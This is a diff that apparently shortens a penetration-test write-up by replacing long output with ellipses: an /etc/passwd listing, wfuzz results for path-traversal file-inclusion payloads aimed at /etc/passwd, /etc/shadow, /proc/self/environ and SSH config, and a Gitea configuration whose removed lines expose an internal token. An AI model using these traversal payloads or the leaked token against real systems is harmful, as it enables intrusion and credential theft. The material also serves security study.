@@ -170,25 +170,7 @@ games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-pollinate:x:105:1::/var/cache/pollinate:/bin/false
-sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-syslog:x:107:113::/home/syslog:/usr/sbin/nologin
-uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+...
 tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
 landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
 fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
@@ -249,54 +231,9 @@ ID           Response   Lines    Word       Chars       Payload
 000000268:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../etc/passwd"                                                                      
 000000267:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                   
 000000266:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                
-000000264:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                          
-000000263:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                       
-000000265:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                             
-000000262:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                    
-000000258:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                        
-000000257:   200        36 L     50 W       1951 Ch     "/etc/passwd"                                                                                                         
-000000259:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                           
-000000261:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                                                 
-000000253:   200        36 L     50 W       1951 Ch     "/./././././././././././etc/passwd"                                                                                   
-000000254:   200        36 L     50 W       1951 Ch     "/../../../../../../../../../../etc/passwd"                                                                           
-000000249:   200        19 L     103 W      767 Ch      "/etc/netconfig"                                                                                                      
-000000250:   200        20 L     63 W       510 Ch      "/etc/nsswitch.conf"                                                                                                  
-000000271:   200        36 L     50 W       1951 Ch     "../../../../../../../../../etc/passwd"                                                                               
-000000269:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../etc/passwd"                                                                         
-000000275:   200        36 L     50 W       1951 Ch     "../../../../../etc/passwd"                                                                                           
-000000277:   200        36 L     50 W       1951 Ch     "../../../etc/passwd"                                                                                                 
-000000276:   200        36 L     50 W       1951 Ch     "../../../../etc/passwd"                                                                                              
-000000274:   200        36 L     50 W       1951 Ch     "../../../../../../etc/passwd"                                                                                        
-000000270:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../etc/passwd"                                                                            
-000000273:   200        36 L     50 W       1951 Ch     "../../../../../../../etc/passwd"                                                                                     
-000000272:   200        36 L     50 W       1951 Ch     "../../../../../../../../etc/passwd"                                                                                  
-000000311:   200        36 L     50 W       1951 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                                          
-000000413:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../../etc/shadow"                                                                      
-000000412:   500        5 L      37 W       265 Ch      "/etc/shadow"                                                                                                         
-000000409:   500        5 L      37 W       265 Ch      "/../../../../../../../../../../etc/shadow"                                                                           
-000000408:   500        5 L      37 W       265 Ch      "/./././././././././././etc/shadow"                                                                                   
-000000400:   200        40 L     117 W      887 Ch      "/etc/rpc"                                                                                                            
-000000399:   200        23 L     142 W      920 Ch      "/etc/resolv.conf"                                                                                                    
-000000423:   500        5 L      37 W       265 Ch      "/etc/sudoers"                                                                                                        
-000000422:   200        122 L    387 W      3252 Ch     "/etc/ssh/sshd_config"                                                                                                
-000000498:   200        0 L      0 W        0 Ch        "/proc/interrupts"                                                                                                    
-000000504:   200        0 L      0 W        0 Ch        "/proc/net/route"                                                                                                     
-000000503:   200        0 L      0 W        0 Ch        "/proc/net/dev"                                                                                                       
-000000501:   200        0 L      0 W        0 Ch        "/proc/mounts"                                                                                                        
-000000497:   200        0 L      0 W        0 Ch        "/proc/cpuinfo"                                                                                                       
-000000502:   200        0 L      0 W        0 Ch        "/proc/net/arp"                                                                                                       
-000000500:   200        0 L      0 W        0 Ch        "/proc/meminfo"                                                                                                       
-000000499:   200        0 L      0 W        0 Ch        "/proc/loadavg"                                                                                                       
-000000505:   200        0 L      0 W        0 Ch        "/proc/net/tcp"                                                                                                       
-000000507:   200        0 L      0 W        0 Ch        "/proc/self/cmdline"                                                                                                  
-000000510:   200        0 L      0 W        0 Ch        "/proc/version"                                                                                                       
-000000509:   200        0 L      0 W        0 Ch        "/proc/self/status"                                                                                                   
-000000506:   200        0 L      0 W        0 Ch        "/proc/partitions"                                                                                                    
-000000508:   200        0 L      0 W        0 Ch        "/proc/self/environ"                                                                                                  
-000000674:   500        5 L      37 W       265 Ch      "/var/log/dmesg"                                                                                                      
-000000640:   500        5 L      37 W       265 Ch      "/var/log"                                                                                                            
-000000671:   500        5 L      37 W       265 Ch      "/var/log/auth.log"                                                                                                   
-000000698:   500        5 L      37 W       265 Ch      "/var/log/kern.log"                                                                                                   
+000000264:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                                                                                     
+...
+                                                                                              
 000000699:   200        0 L      2 W        292292 Ch   "/var/log/lastlog"                                                                                                    
 000000741:   200        16 L     40 W       11520 Ch    "/var/log/wtmp"                                                                                                       
 000000750:   200        6 L      12 W       1920 Ch     "/var/run/utmp"                                                                                                       
@@ -565,54 +502,7 @@ LOG_SQL = false
 SCHEMA = 
 SSL_MODE = disable
 
-[indexer]
-ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve
-
-[session]
-PROVIDER_CONFIG = /data/gitea/sessions
-PROVIDER = file
-
-[picture]
-AVATAR_UPLOAD_PATH = /data/gitea/avatars
-REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars
-
-[attachment]
-PATH = /data/gitea/attachments
-
-[log]
-MODE = console
-LEVEL = info
-ROOT_PATH = /data/gitea/log
-
-[security]
-INSTALL_LOCK = true
-SECRET_KEY = 
-REVERSE_PROXY_LIMIT = 1
-REVERSE_PROXY_TRUSTED_PROXIES = *
-INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
-PASSWORD_HASH_ALGO = pbkdf2
-
-[service]
-DISABLE_REGISTRATION = false
-REQUIRE_SIGNIN_VIEW = false
-REGISTER_EMAIL_CONFIRM = false
-ENABLE_NOTIFY_MAIL = false
-ALLOW_ONLY_EXTERNAL_REGISTRATION = false
-ENABLE_CAPTCHA = false
-DEFAULT_KEEP_EMAIL_PRIVATE = false
-DEFAULT_ALLOW_CREATE_ORGANIZATION = true
-DEFAULT_ENABLE_TIMETRACKING = true
-NO_REPLY_ADDRESS = noreply.localhost
-
-[lfs]
-PATH = /data/git/lfs
-
-[mailer]
-ENABLED = false
-
-[openid]
-ENABLE_OPENID_SIGNIN = true
-ENABLE_OPENID_SIGNUP = true
+...
 
 [cron.update_checker]
 ENABLED = false
